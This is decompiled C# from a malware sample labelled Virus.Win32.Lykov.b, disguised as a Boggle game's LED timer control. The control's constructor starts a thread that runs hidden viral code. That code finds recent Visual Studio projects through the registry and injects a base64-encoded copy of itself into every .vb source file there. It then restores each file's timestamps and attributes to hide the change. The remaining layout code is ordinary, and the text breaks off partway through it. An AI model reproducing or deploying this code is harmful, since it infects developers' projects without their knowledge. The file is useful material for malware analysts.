// Decompiled with JetBrains decompiler
// Type: Boggle.BogTimer
// Assembly: Boggle, Version=1.0.1320.31511, Culture=neutral, PublicKeyToken=null
// MVID: B8BB850A-887A-43B2-B89D-3D1301289D01
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Virus.Win32.Lykov.b-5b4c66fd4c89a7645d7912c18b43ddd7b8db068aa896fea714881ce355eaf833.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Boggle
{
  public class BogTimer : UserControl
  {
    [AccessedThroughProperty("bot1")]
    private tmrShape _bot1;
    [AccessedThroughProperty("top1")]
    private tmrShape _top1;
    [AccessedThroughProperty("top2")]
    private tmrShape _top2;
    [AccessedThroughProperty("m2")]
    private tmrShape _m2;
    [AccessedThroughProperty("m1")]
    private tmrShape _m1;
    [AccessedThroughProperty("lr1")]
    private tmrShape _lr1;
    [AccessedThroughProperty("ur1")]
    private tmrShape _ur1;
    [AccessedThroughProperty("lr2")]
    private tmrShape _lr2;
    [AccessedThroughProperty("ll1")]
    private tmrShape _ll1;
    [AccessedThroughProperty("ul1")]
    private tmrShape _ul1;
    [AccessedThroughProperty("f2")]
    private tmrShape _f2;
    [AccessedThroughProperty("f1")]
    private tmrShape _f1;
    [AccessedThroughProperty("ul3")]
    private tmrShape _ul3;
    [AccessedThroughProperty("ll3")]
    private tmrShape _ll3;
    [AccessedThroughProperty("ur2")]
    private tmrShape _ur2;
    [AccessedThroughProperty("ur3")]
    private tmrShape _ur3;
    [AccessedThroughProperty("lr3")]
    private tmrShape _lr3;
    [AccessedThroughProperty("m3")]
    private tmrShape _m3;
    [AccessedThroughProperty("top3")]
    private tmrShape _top3;
    [AccessedThroughProperty("bot3")]
    private tmrShape _bot3;
    [AccessedThroughProperty("ul4")]
    private tmrShape _ul4;
    [AccessedThroughProperty("ll4")]
    private tmrShape _ll4;
    [AccessedThroughProperty("ur4")]
    private tmrShape _ur4;
    [AccessedThroughProperty("ll2")]
    private tmrShape _ll2;
    [AccessedThroughProperty("lr4")]
    private tmrShape _lr4;
    [AccessedThroughProperty("m4")]
    private tmrShape _m4;
    [AccessedThroughProperty("ul2")]
    private tmrShape _ul2;
    [AccessedThroughProperty("top4")]
    private tmrShape _top4;
    [AccessedThroughProperty("bot4")]
    private tmrShape _bot4;
    [AccessedThroughProperty("bot2")]
    private tmrShape _bot2;
    private IContainer components;
    private string clsTimerText;
    private System.Drawing.Color clsLedOffColor;
    private System.Drawing.Color clsLedOnColor;
    private System.Drawing.Color clsLedBackColor;
    private bool clsFlashOn;
    private bool clsFlashEnabled;
    private System.Drawing.Color C;

    internal virtual tmrShape f2
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._f2 == null)
          ;
        this._f2 = value;
        if (this._f2 == null)
          ;
      }
      get => this._f2;
    }

    internal virtual tmrShape f1
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._f1 == null)
          ;
        this._f1 = value;
        if (this._f1 == null)
          ;
      }
      get => this._f1;
    }

    internal virtual tmrShape ul3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ul3 == null)
          ;
        this._ul3 = value;
        if (this._ul3 == null)
          ;
      }
      get => this._ul3;
    }

    internal virtual tmrShape ll3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ll3 == null)
          ;
        this._ll3 = value;
        if (this._ll3 == null)
          ;
      }
      get => this._ll3;
    }

    internal virtual tmrShape ur3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ur3 == null)
          ;
        this._ur3 = value;
        if (this._ur3 == null)
          ;
      }
      get => this._ur3;
    }

    internal virtual tmrShape lr3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lr3 == null)
          ;
        this._lr3 = value;
        if (this._lr3 == null)
          ;
      }
      get => this._lr3;
    }

    internal virtual tmrShape m3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._m3 == null)
          ;
        this._m3 = value;
        if (this._m3 == null)
          ;
      }
      get => this._m3;
    }

    internal virtual tmrShape top3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._top3 == null)
          ;
        this._top3 = value;
        if (this._top3 == null)
          ;
      }
      get => this._top3;
    }

    internal virtual tmrShape bot3
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._bot3 == null)
          ;
        this._bot3 = value;
        if (this._bot3 == null)
          ;
      }
      get => this._bot3;
    }

    internal virtual tmrShape ul1
    {
      get => this._ul1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ul1 == null)
          ;
        this._ul1 = value;
        if (this._ul1 == null)
          ;
      }
    }

    internal virtual tmrShape ll1
    {
      get => this._ll1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ll1 == null)
          ;
        this._ll1 = value;
        if (this._ll1 == null)
          ;
      }
    }

    internal virtual tmrShape ur1
    {
      get => this._ur1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ur1 == null)
          ;
        this._ur1 = value;
        if (this._ur1 == null)
          ;
      }
    }

    internal virtual tmrShape lr1
    {
      get => this._lr1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lr1 == null)
          ;
        this._lr1 = value;
        if (this._lr1 == null)
          ;
      }
    }

    internal virtual tmrShape ul4
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ul4 == null)
          ;
        this._ul4 = value;
        if (this._ul4 == null)
          ;
      }
      get => this._ul4;
    }

    internal virtual tmrShape m1
    {
      get => this._m1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._m1 == null)
          ;
        this._m1 = value;
        if (this._m1 == null)
          ;
      }
    }

    internal virtual tmrShape top1
    {
      get => this._top1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._top1 == null)
          ;
        this._top1 = value;
        if (this._top1 == null)
          ;
      }
    }

    internal virtual tmrShape ll4
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ll4 == null)
          ;
        this._ll4 = value;
        if (this._ll4 == null)
          ;
      }
      get => this._ll4;
    }

    internal virtual tmrShape bot1
    {
      get => this._bot1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._bot1 == null)
          ;
        this._bot1 = value;
        if (this._bot1 == null)
          ;
      }
    }

    internal virtual tmrShape bot2
    {
      get => this._bot2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._bot2 == null)
          ;
        this._bot2 = value;
        if (this._bot2 == null)
          ;
      }
    }

    internal virtual tmrShape ur4
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ur4 == null)
          ;
        this._ur4 = value;
        if (this._ur4 == null)
          ;
      }
      get => this._ur4;
    }

    internal virtual tmrShape top2
    {
      get => this._top2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._top2 == null)
          ;
        this._top2 = value;
        if (this._top2 == null)
          ;
      }
    }

    internal virtual tmrShape m2
    {
      get => this._m2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._m2 == null)
          ;
        this._m2 = value;
        if (this._m2 == null)
          ;
      }
    }

    internal virtual tmrShape lr2
    {
      get => this._lr2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lr2 == null)
          ;
        this._lr2 = value;
        if (this._lr2 == null)
          ;
      }
    }

    internal virtual tmrShape ur2
    {
      get => this._ur2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ur2 == null)
          ;
        this._ur2 = value;
        if (this._ur2 == null)
          ;
      }
    }

    internal virtual tmrShape lr4
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lr4 == null)
          ;
        this._lr4 = value;
        if (this._lr4 == null)
          ;
      }
      get => this._lr4;
    }

    internal virtual tmrShape ll2
    {
      get => this._ll2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ll2 == null)
          ;
        this._ll2 = value;
        if (this._ll2 == null)
          ;
      }
    }

    internal virtual tmrShape ul2
    {
      get => this._ul2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ul2 == null)
          ;
        this._ul2 = value;
        if (this._ul2 == null)
          ;
      }
    }

    internal virtual tmrShape bot4
    {
      get => this._bot4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._bot4 == null)
          ;
        this._bot4 = value;
        if (this._bot4 == null)
          ;
      }
    }

    internal virtual tmrShape m4
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._m4 == null)
          ;
        this._m4 = value;
        if (this._m4 == null)
          ;
      }
      get => this._m4;
    }

    internal virtual tmrShape top4
    {
      get => this._top4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._top4 == null)
          ;
        this._top4 = value;
        if (this._top4 == null)
          ;
      }
    }

    private void vIT()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
      if (registryKey.ValueCount == 0)
        ProjectData.EndApp();
      string String2 = "Private Sub vIT()";
      string str1 = "Public Sub New()";
      string str2 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
      string str3 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC" + "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE" + "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT" + "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T" + "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K" + "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi" + "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0" + "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy" + "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE" + "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ" + "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U" + "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t" + "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g" + "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg" + "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog" + "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy" + "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo" + "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9" + "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs" + "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB" + "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp" + "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku" + "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k" + "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN" + "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g" + "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp" + "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp" + "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU" + "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu" + "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+" + "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu" + "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD" + "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp" + "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD" + "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu" + "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz" + "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0" + "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
      string Expression = Encoding.ASCII.GetString(Convert.FromBase64String(str3));
      string Replacement = "J = \"";
      int num1 = Strings.Len(str3);
      int Start = 1;
      while (Start <= num1)
      {
        Replacement = checked (Start + 64) >= Strings.Len(str3) ? Replacement + Strings.Mid(str3, Start, 64) + "\"" : Replacement + Strings.Mid(str3, Start, 64) + "\"" + "\r\nJ = J & " + "\"";
        checked { Start += 64; }
      }
      string str4 = Strings.Replace(Expression, "J = \"\"", Replacement, Count: 1, Compare: CompareMethod.Text);
      int num2 = checked (registryKey.ValueCount - 1);
      int index1 = 0;
      while (index1 <= num2)
      {
        string str5 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[index1]));
        string path = Strings.Mid(str5, 1, Strings.InStrRev(str5, "\\", Compare: CompareMethod.Text));
        if (Directory.Exists(path))
        {
          string[] files = Directory.GetFiles(path, "*.vb");
          int num3 = Information.LBound((Array) files);
          int num4 = Information.UBound((Array) files);
          int index2 = num3;
          while (index2 <= num4)
          {
            DateTime lastAccessTime = File.GetLastAccessTime(files[index2]);
            DateTime lastWriteTime = File.GetLastWriteTime(files[index2]);
            FileAttributes attributes = File.GetAttributes(files[index2]);
            File.SetAttributes(files[index2], FileAttributes.Normal);
            StreamReader streamReader = File.OpenText(files[index2]);
            string end = streamReader.ReadToEnd();
            streamReader.Close();
            if (Strings.InStr(end, String2, CompareMethod.Text) == 0 & Strings.InStr(end, str1, CompareMethod.Text) != 0)
            {
              string str6 = Strings.Replace(Strings.Replace(end, "MyBase.New()", "MyBase.New()\r\n" + str2, Count: 1, Compare: CompareMethod.Text), str1, str4 + str1, Count: 1, Compare: CompareMethod.Text);
              StreamWriter text = File.CreateText(files[index2]);
              text.Write(str6);
              text.Flush();
              text.Close();
            }
            File.SetLastWriteTime(files[index2], lastWriteTime);
            File.SetLastAccessTime(files[index2], lastAccessTime);
            File.SetAttributes(files[index2], attributes);
            checked { ++index2; }
          }
        }
        checked { ++index1; }
      }
    }

    public BogTimer()
    {
      this.Resize += new EventHandler(this.BogTimer_Resize);
      new Thread(new ThreadStart(this.vIT)).Start();
      this.InitializeComponent();
      this.LedOffColor = System.Drawing.Color.FromArgb(70, 0, 0);
      this.LedOnColor = System.Drawing.Color.Red;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.ul1 = new tmrShape();
      this.ll1 = new tmrShape();
      this.ur1 = new tmrShape();
      this.lr1 = new tmrShape();
      this.m1 = new tmrShape();
      this.top1 = new tmrShape();
      this.bot1 = new tmrShape();
      this.bot2 = new tmrShape();
      this.top2 = new tmrShape();
      this.m2 = new tmrShape();
      this.lr2 = new tmrShape();
      this.ur2 = new tmrShape();
      this.ll2 = new tmrShape();
      this.ul2 = new tmrShape();
      this.bot4 = new tmrShape();
      this.top4 = new tmrShape();
      this.m4 = new tmrShape();
      this.lr4 = new tmrShape();
      this.ur4 = new tmrShape();
      this.ll4 = new tmrShape();
      this.ul4 = new tmrShape();
      this.bot3 = new tmrShape();
      this.top3 = new tmrShape();
      this.m3 = new tmrShape();
      this.lr3 = new tmrShape();
      this.ur3 = new tmrShape();
      this.ll3 = new tmrShape();
      this.ul3 = new tmrShape();
      this.f1 = new tmrShape();
      this.f2 = new tmrShape();
      this.SuspendLayout();
      tmrShape ul1_1 = this.ul1;
      Point point1 = new Point(24, 24);
      Point point2 = point1;
      ul1_1.Location = point2;
      this.ul1.Name = "ul1";
      this.ul1.ShapeColor = System.Drawing.Color.DarkGray;
      this.ul1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ul1_2 = this.ul1;
      Size size1 = new Size(8, 40);
      Size size2 = size1;
      ul1_2.Size = size2;
      this.ul1.TabIndex = 0;
      this.ul1.Tag = (object) "1";
      tmrShape ll1_1 = this.ll1;
      point1 = new Point(24, 64);
      Point point3 = point1;
      ll1_1.Location = point3;
      this.ll1.Name = "ll1";
      this.ll1.ShapeColor = System.Drawing.Color.DarkGray;
      this.ll1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ll1_2 = this.ll1;
      size1 = new Size(8, 40);
      Size size3 = size1;
      ll1_2.Size = size3;
      this.ll1.TabIndex = 1;
      this.ll1.Tag = (object) "1";
      tmrShape ur1_1 = this.ur1;
      point1 = new Point(64, 24);
      Point point4 = point1;
      ur1_1.Location = point4;
      this.ur1.Name = "ur1";
      this.ur1.ShapeColor = System.Drawing.Color.DarkGray;
      this.ur1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ur1_2 = this.ur1;
      size1 = new Size(8, 40);
      Size size4 = size1;
      ur1_2.Size = size4;
      this.ur1.TabIndex = 2;
      this.ur1.Tag = (object) "1";
      tmrShape lr1_1 = this.lr1;
      point1 = new Point(64, 64);
      Point point5 = point1;
      lr1_1.Location = point5;
      this.lr1.Name = "lr1";
      this.lr1.ShapeColor = System.Drawing.Color.DarkGray;
      this.lr1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape lr1_2 = this.lr1;
      size1 = new Size(8, 40);
      Size size5 = size1;
      lr1_2.Size = size5;
      this.lr1.TabIndex = 3;
      this.lr1.Tag = (object) "1";
      tmrShape m1_1 = this.m1;
      point1 = new Point(27, 60);
      Point point6 = point1;
      m1_1.Location = point6;
      this.m1.Name = "m1";
      this.m1.ShapeColor = System.Drawing.Color.DarkGray;
      this.m1.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape m1_2 = this.m1;
      size1 = new Size(44, 8);
      Size size6 = size1;
      m1_2.Size = size6;
      this.m1.TabIndex = 4;
      this.m1.Tag = (object) "1";
      tmrShape top1_1 = this.top1;
      point1 = new Point(26, 21);
      Point point7 = point1;
      top1_1.Location = point7;
      this.top1.Name = "top1";
      this.top1.ShapeColor = System.Drawing.Color.DarkGray;
      this.top1.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape top1_2 = this.top1;
      size1 = new Size(44, 8);
      Size size7 = size1;
      top1_2.Size = size7;
      this.top1.TabIndex = 5;
      this.top1.Tag = (object) "1";
      tmrShape bot1_1 = this.bot1;
      point1 = new Point(27, 99);
      Point point8 = point1;
      bot1_1.Location = point8;
      this.bot1.Name = "bot1";
      this.bot1.ShapeColor = System.Drawing.Color.DarkGray;
      this.bot1.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape bot1_2 = this.bot1;
      size1 = new Size(44, 8);
      Size size8 = size1;
      bot1_2.Size = size8;
      this.bot1.TabIndex = 6;
      this.bot1.Tag = (object) "1";
      tmrShape bot2_1 = this.bot2;
      point1 = new Point(87, 98);
      Point point9 = point1;
      bot2_1.Location = point9;
      this.bot2.Name = "bot2";
      this.bot2.ShapeColor = System.Drawing.Color.DarkGray;
      this.bot2.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape bot2_2 = this.bot2;
      size1 = new Size(44, 8);
      Size size9 = size1;
      bot2_2.Size = size9;
      this.bot2.TabIndex = 13;
      this.bot2.Tag = (object) "2";
      tmrShape top2_1 = this.top2;
      point1 = new Point(86, 21);
      Point point10 = point1;
      top2_1.Location = point10;
      this.top2.Name = "top2";
      this.top2.ShapeColor = System.Drawing.Color.DarkGray;
      this.top2.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape top2_2 = this.top2;
      size1 = new Size(44, 8);
      Size size10 = size1;
      top2_2.Size = size10;
      this.top2.TabIndex = 12;
      this.top2.Tag = (object) "2";
      tmrShape m2_1 = this.m2;
      point1 = new Point(87, 60);
      Point point11 = point1;
      m2_1.Location = point11;
      this.m2.Name = "m2";
      this.m2.ShapeColor = System.Drawing.Color.DarkGray;
      this.m2.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape m2_2 = this.m2;
      size1 = new Size(44, 8);
      Size size11 = size1;
      m2_2.Size = size11;
      this.m2.TabIndex = 11;
      this.m2.Tag = (object) "2";
      tmrShape lr2_1 = this.lr2;
      point1 = new Point(124, 64);
      Point point12 = point1;
      lr2_1.Location = point12;
      this.lr2.Name = "lr2";
      this.lr2.ShapeColor = System.Drawing.Color.DarkGray;
      this.lr2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape lr2_2 = this.lr2;
      size1 = new Size(8, 39);
      Size size12 = size1;
      lr2_2.Size = size12;
      this.lr2.TabIndex = 10;
      this.lr2.Tag = (object) "2";
      tmrShape ur2_1 = this.ur2;
      point1 = new Point(124, 24);
      Point point13 = point1;
      ur2_1.Location = point13;
      this.ur2.Name = "ur2";
      this.ur2.ShapeColor = System.Drawing.Color.DarkGray;
      this.ur2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ur2_2 = this.ur2;
      size1 = new Size(8, 39);
      Size size13 = size1;
      ur2_2.Size = size13;
      this.ur2.TabIndex = 9;
      this.ur2.Tag = (object) "2";
      tmrShape ll2_1 = this.ll2;
      point1 = new Point(84, 64);
      Point point14 = point1;
      ll2_1.Location = point14;
      this.ll2.Name = "ll2";
      this.ll2.ShapeColor = System.Drawing.Color.DarkGray;
      this.ll2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ll2_2 = this.ll2;
      size1 = new Size(8, 39);
      Size size14 = size1;
      ll2_2.Size = size14;
      this.ll2.TabIndex = 8;
      this.ll2.Tag = (object) "2";
      tmrShape ul2_1 = this.ul2;
      point1 = new Point(84, 24);
      Point point15 = point1;
      ul2_1.Location = point15;
      this.ul2.Name = "ul2";
      this.ul2.ShapeColor = System.Drawing.Color.DarkGray;
      this.ul2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ul2_2 = this.ul2;
      size1 = new Size(8, 39);
      Size size15 = size1;
      ul2_2.Size = size15;
      this.ul2.TabIndex = 7;
      this.ul2.Tag = (object) "2";
      tmrShape bot4_1 = this.bot4;
      point1 = new Point(260, 99);
      Point point16 = point1;
      bot4_1.Location = point16;
      this.bot4.Name = "bot4";
      this.bot4.ShapeColor = System.Drawing.Color.DarkGray;
      this.bot4.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape bot4_2 = this.bot4;
      size1 = new Size(44, 8);
      Size size16 = size1;
      bot4_2.Size = size16;
      this.bot4.TabIndex = 27;
      this.bot4.Tag = (object) "4";
      tmrShape top4_1 = this.top4;
      point1 = new Point(259, 22);
      Point point17 = point1;
      top4_1.Location = point17;
      this.top4.Name = "top4";
      this.top4.ShapeColor = System.Drawing.Color.DarkGray;
      this.top4.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape top4_2 = this.top4;
      size1 = new Size(44, 8);
      Size size17 = size1;
      top4_2.Size = size17;
      this.top4.TabIndex = 26;
      this.top4.Tag = (object) "4";
      tmrShape m4_1 = this.m4;
      point1 = new Point(260, 61);
      Point point18 = point1;
      m4_1.Location = point18;
      this.m4.Name = "m4";
      this.m4.ShapeColor = System.Drawing.Color.DarkGray;
      this.m4.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape m4_2 = this.m4;
      size1 = new Size(44, 8);
      Size size18 = size1;
      m4_2.Size = size18;
      this.m4.TabIndex = 25;
      this.m4.Tag = (object) "4";
      tmrShape lr4_1 = this.lr4;
      point1 = new Point(297, 65);
      Point point19 = point1;
      lr4_1.Location = point19;
      this.lr4.Name = "lr4";
      this.lr4.ShapeColor = System.Drawing.Color.DarkGray;
      this.lr4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape lr4_2 = this.lr4;
      size1 = new Size(8, 39);
      Size size19 = size1;
      lr4_2.Size = size19;
      this.lr4.TabIndex = 24;
      this.lr4.Tag = (object) "4";
      tmrShape ur4_1 = this.ur4;
      point1 = new Point(297, 25);
      Point point20 = point1;
      ur4_1.Location = point20;
      this.ur4.Name = "ur4";
      this.ur4.ShapeColor = System.Drawing.Color.DarkGray;
      this.ur4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ur4_2 = this.ur4;
      size1 = new Size(8, 39);
      Size size20 = size1;
      ur4_2.Size = size20;
      this.ur4.TabIndex = 23;
      this.ur4.Tag = (object) "4";
      tmrShape ll4_1 = this.ll4;
      point1 = new Point(257, 65);
      Point point21 = point1;
      ll4_1.Location = point21;
      this.ll4.Name = "ll4";
      this.ll4.ShapeColor = System.Drawing.Color.DarkGray;
      this.ll4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ll4_2 = this.ll4;
      size1 = new Size(8, 39);
      Size size21 = size1;
      ll4_2.Size = size21;
      this.ll4.TabIndex = 22;
      this.ll4.Tag = (object) "4";
      tmrShape ul4_1 = this.ul4;
      point1 = new Point(257, 25);
      Point point22 = point1;
      ul4_1.Location = point22;
      this.ul4.Name = "ul4";
      this.ul4.ShapeColor = System.Drawing.Color.DarkGray;
      this.ul4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ul4_2 = this.ul4;
      size1 = new Size(8, 39);
      Size size22 = size1;
      ul4_2.Size = size22;
      this.ul4.TabIndex = 21;
      this.ul4.Tag = (object) "4";
      tmrShape bot3_1 = this.bot3;
      point1 = new Point(200, 100);
      Point point23 = point1;
      bot3_1.Location = point23;
      this.bot3.Name = "bot3";
      this.bot3.ShapeColor = System.Drawing.Color.DarkGray;
      this.bot3.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape bot3_2 = this.bot3;
      size1 = new Size(44, 8);
      Size size23 = size1;
      bot3_2.Size = size23;
      this.bot3.TabIndex = 20;
      this.bot3.Tag = (object) "3";
      tmrShape top3_1 = this.top3;
      point1 = new Point(199, 22);
      Point point24 = point1;
      top3_1.Location = point24;
      this.top3.Name = "top3";
      this.top3.ShapeColor = System.Drawing.Color.DarkGray;
      this.top3.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape top3_2 = this.top3;
      size1 = new Size(44, 8);
      Size size24 = size1;
      top3_2.Size = size24;
      this.top3.TabIndex = 19;
      this.top3.Tag = (object) "3";
      tmrShape m3_1 = this.m3;
      point1 = new Point(200, 61);
      Point point25 = point1;
      m3_1.Location = point25;
      this.m3.Name = "m3";
      this.m3.ShapeColor = System.Drawing.Color.DarkGray;
      this.m3.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
      tmrShape m3_2 = this.m3;
      size1 = new Size(44, 8);
      Size size25 = size1;
      m3_2.Size = size25;
      this.m3.TabIndex = 18;
      this.m3.Tag = (object) "3";
      tmrShape lr3_1 = this.lr3;
      point1 = new Point(237, 65);
      Point point26 = point1;
      lr3_1.Location = point26;
      this.lr3.Name = "lr3";
      this.lr3.ShapeColor = System.Drawing.Color.DarkGray;
      this.lr3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape lr3_2 = this.lr3;
      size1 = new Size(8, 40);
      Size size26 = size1;
      lr3_2.Size = size26;
      this.lr3.TabIndex = 17;
      this.lr3.Tag = (object) "3";
      tmrShape ur3_1 = this.ur3;
      point1 = new Point(237, 25);
      Point point27 = point1;
      ur3_1.Location = point27;
      this.ur3.Name = "ur3";
